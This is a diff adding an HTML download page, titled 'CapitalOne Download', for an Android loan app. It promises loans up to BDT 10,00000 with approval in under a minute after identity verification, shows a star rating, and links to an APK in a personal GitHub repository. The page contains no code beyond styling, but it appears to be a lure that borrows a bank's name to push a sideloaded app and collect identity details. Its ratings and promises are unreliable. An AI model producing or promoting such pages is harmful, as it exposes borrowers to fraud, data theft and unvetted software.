@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CapitalOne Download</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to right, #00aaff, #6a00ff);
+            color: #333;
+        }
+
+        header {
+            text-align: center;
+            padding: 20px;
+            color: #fff;
+        }
+
+        header h1 {
+            font-family: 'Cursive', sans-serif;
+            font-size: 2.5rem;
+        }
+
+        main {
+            max-width: 1200px;
+            margin: auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .content {
+            background: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .content img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .content h2 {
+            color: #000;
+            margin: 20px 0;
+        }
+
+        .content p {
+            color: #555;
+            margin: 10px 0;
+        }
+
+        .content p.warning {
+            color: green;
+            font-weight: bold;
+        }
+
+        .rating {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            font-size: 1rem;
+            color: #555;
+        }
+
+        .rating .stars {
+            font-size: 1.2rem;
+            color: #f4b400; /* Golden yellow color for the stars */
+        }
+
+        .rating div {
+            font-size: 1rem;
+        }
+
+        .details {
+            margin-top: 15px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #777;
+        }
+
+        .details p {
+            margin: 5px 0;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .buttons a {
+            text-decoration: none;
+            color: #fff;
+            padding: 15px 30px; /* Increased padding for larger button size */
+            border-radius: 8px; /* Slightly larger border-radius for aesthetic purposes */
+            font-weight: bold;
+            font-size: 1.2rem; /* Increased font size */
+        }
+
+        .buttons .download {
+            background: #007bff;
+        }
+
+        .buttons .try-app {
+            background: #555;
+        }
+
+        .buttons a:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Download Apk</h1>
+    </header>
+    <main>
+        <div class="content">
+            <h2> Best Loan Service</h2>
+            <p>A convenient, secure, and stable lending platform.</p>
+            <p class="warning">Get approved in less than a minute. Complete your identity verification and get access to loans up to BDT 10,00000.</p>
+            
+            <div class="rating">
+                <div class="stars">&#9733;&#9733;&#9733;&#9733;&#9734;</div>
+                <div>4.5 (33 reviews)</div>
+            </div>
+
+            <div class="details">
+                <p>Download size: 5.3 MB</p>
+                <p>Rated for 3+</p>
+            </div>
+            
+            <div class="buttons">
+                <a href="https://github.com/koi-batija/apk/raw/refs/heads/main/CapitalOne_1.1..apk" class="download">Download Apk</a>
+            </div>
+        </div>
+    </main>
+</body>
+</html>
